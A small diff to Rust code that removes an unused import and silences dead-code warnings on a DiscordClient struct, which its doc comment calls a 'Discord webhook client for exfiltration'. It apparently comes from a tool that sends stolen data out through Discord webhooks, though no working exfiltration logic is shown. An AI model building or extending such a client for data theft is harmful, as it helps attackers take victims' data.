@@ -16,7 +16,6 @@ use std::io::{Read, Write};
 use std::net::{TcpStream, ToSocketAddrs};
 use std::time::Duration;
 
-use crate::module::transport::config::TransportConfig;
 
 /// Discord-specific errors
 #[derive(Debug, Clone)]
@@ -45,7 +44,9 @@ impl std::error::Error for DiscordError {}
 /// Discord webhook client for exfiltration
 pub struct DiscordClient {
     webhook_url: String,
+    #[allow(dead_code)]
     webhook_id: String,
+    #[allow(dead_code)]
     webhook_token: String,
     timeout: Duration,
 }
